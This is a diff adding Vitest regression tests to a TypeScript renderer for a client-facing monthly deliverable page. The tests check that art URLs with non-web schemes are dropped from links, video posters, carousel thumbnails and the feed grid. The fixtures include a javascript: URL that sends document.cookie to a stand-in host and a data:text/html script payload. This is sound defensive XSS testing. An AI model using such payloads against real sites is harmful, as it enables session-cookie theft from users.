@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { renderizarContenido } from '@/render/contenido/documento';
+import { renderizarContenido, type PiezaEntregable } from '@/render/contenido/documento';
 import { metaFalsa, piezasFalsas } from '../fixtures/contenido';
 
 // Las comprobaciones negativas miran solo el marcado: los estilos y el script
@@ -281,5 +281,69 @@ describe('entregable del mes · revisión del cliente', () => {
     expect(html).toContain('.revision-botones{display:none');
     expect(html).toContain('html.js .revision-botones{display:flex;}');
     expect(html).toContain('hace falta tener JavaScript activado');
+  });
+});
+
+/**
+ * Defensa en profundidad sobre lo YA guardado. `contenido_piezas.arte` es
+ * `jsonb` y `piezaVisibleJson` hace un `as Arte[]`, no un `parse`: una fila
+ * escrita antes de que el esquema exigiera http/https llegaría intacta hasta
+ * aquí. Y este mismo documento se sirve por el enlace público `/p/…`, que no
+ * caduca y lo abre cualquiera, así que cerrar solo la entrada no basta.
+ */
+describe('entregable del mes · un enlace de arte con esquema raro no llega al HTML', () => {
+  const MALO = 'javascript:fetch("https://malo.mx?c="+document.cookie)';
+
+  const conArte = (arte: PiezaEntregable['arte']): string => render([{
+    id: 'px', numero: 9, formato: 'reel', plataforma: 'instagram',
+    fechaPublicacion: '2026-09-15', copy: 'x', cta: '', hashtags: '',
+    arte, estadoCliente: 'pendiente', notaCliente: null,
+  }]);
+
+  it('el «Ver el reel» no se pinta si el enlace no es web', () => {
+    const html = conArte([{ tipo: 'video', url: MALO }]);
+    expect(marcado(html)).not.toContain('javascript:');
+    expect(marcado(html)).not.toContain('class="pieza-enlace"');
+    // Y en su lugar queda el hueco honesto, no una imagen rota.
+    expect(html).toContain('arte-pendiente');
+  });
+
+  it('con un enlace web sí se pinta, para que se vea que el corte es por el esquema', () => {
+    const html = conArte([{ tipo: 'video', url: 'https://videos.ejemplo.mx/r.mp4' }]);
+    expect(html).toContain('class="pieza-enlace" href="https://videos.ejemplo.mx/r.mp4"');
+  });
+
+  it('tampoco se cuela por el `src` del visor ni por las miniaturas del carrusel', () => {
+    const html = conArte([
+      { tipo: 'portada', url: MALO },
+      { tipo: 'imagen', url: 'data:text/html,<script>alert(1)</script>' },
+    ]);
+    expect(marcado(html)).not.toContain('javascript:');
+    expect(marcado(html)).not.toContain('data:text/html');
+    expect(marcado(html)).not.toContain('data-slide=');
+    expect(html).toContain('arte-pendiente');
+  });
+
+  it('ni por el `poster` del reproductor, que es el otro sitio donde cae la portada', () => {
+    const html = conArte([
+      { tipo: 'portada', url: MALO },
+      // Con el video subido al Studio sí hay reproductor, y su `poster` sale de
+      // la portada: es el caso en que el atributo de verdad se pinta.
+      { tipo: 'video', fileId: '77777777-7777-4777-8777-777777777777' },
+    ]);
+    expect(html).toContain('<video controls preload="metadata"');
+    expect(marcado(html)).not.toContain('javascript:');
+    expect(marcado(html)).not.toContain('poster=');
+  });
+
+  it('ni por la cuadrícula del feed de la sección 01', () => {
+    const html = render([{
+      id: 'py', numero: 1, formato: 'post', plataforma: 'ambas',
+      fechaPublicacion: '2026-09-02', copy: '', cta: '', hashtags: '',
+      arte: [{ tipo: 'imagen', url: MALO }], estadoCliente: 'pendiente', notaCliente: null,
+    }]);
+    expect(marcado(html)).not.toContain('javascript:');
+    // La celda se pinta igual, con el número en vez de la imagen.
+    expect(html).toContain('class="feed-vacia"');
   });
 });
